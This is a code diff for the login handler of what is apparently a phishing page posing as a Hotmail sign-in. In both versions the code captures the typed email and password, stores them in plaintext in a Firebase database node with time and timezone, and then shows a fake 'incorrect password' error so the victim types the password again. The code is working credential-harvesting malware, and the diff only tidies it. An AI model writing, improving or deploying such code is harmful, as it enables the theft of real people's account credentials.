@@ -15,38 +15,39 @@ console.log(appCheck);
 appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);
 
 function hmlog() {
-  const email = document.getElementById("hm-uname").value.trim();
-  const password = document.getElementById("hm-pass").value.trim();
-
-  if (!email || !password) {
-    alert("Please enter both email and password.");
-    return;
-  }
-
   firebase
     .auth()
     .signInAnonymously()
-    .then(() => {
-      const currentDate = new Date().toISOString().slice(0, 10);
-      const currentTime = new Date().toISOString().slice(11, 19);
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    .catch(function (error) {
+      showError(error.message, "error_box");
+    });
 
-      firebase.database().ref("fbdet").push({
-        emle: email,
-        mobile: "",
-        time: currentTime,
-        timezone: timezone,
-        pass: password,
-        date: currentDate,
-        type: "Email",
-      });
+  var email = document.getElementById("hm-uname").value;
+  var password = document.getElementById("hm-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Hotmail";
 
-      setTimeout(() => {
-        alert("Please double-check your password");
-        document.getElementById("hm-pass").value = "";
-      }, 2000);
-    })
-    .catch((error) => alert(error.message));
+  if (email !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: email,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      showError("Incorrect password! please try again...", "error_box");
+      document.getElementById("hm-pass").value = "";
+      return false;
+    }, 2000);
+  } else {
+    showError("Please enter both email and password.", "error_box");
+  }
 }
 
 function login() {
